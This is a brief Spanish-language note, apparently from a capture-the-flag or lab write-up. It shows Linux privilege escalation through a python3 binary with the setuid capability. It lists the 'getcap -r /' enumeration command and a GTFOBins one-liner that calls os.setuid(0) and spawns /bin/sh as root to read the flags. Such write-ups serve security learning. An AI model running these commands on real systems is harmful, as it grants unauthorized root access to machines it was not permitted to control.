#getcapbinariopython38

Usamos el comando `getcap -r / 2>/dev/null` y vemos que tiene una capability en python

![[Cap14.png]]

Vamos a vamos a [gtfobinds](https://gtfobins.github.io/gtfobins/python/#capabilities), nos da este oneliner
![[Cap13.png]]
Lo adaptamos a nuestra maquina ``python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`` lo ejecutamos y ya podemos visualizar las flags

![[Cap15.png]]